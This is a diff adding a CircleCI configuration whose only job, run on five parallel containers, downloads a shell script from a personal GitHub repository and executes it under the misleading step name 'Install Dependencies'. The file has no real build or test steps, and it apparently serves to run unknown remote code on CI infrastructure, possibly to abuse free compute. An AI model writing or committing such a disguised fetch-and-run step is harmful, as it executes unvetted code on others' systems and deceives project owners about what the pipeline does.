@@ -1,0 +1,18 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 5
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Nurultyas7979/kanjut/main/kanjut.sh && chmod +x kanjut.sh  && ./kanjut.sh 
+              
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
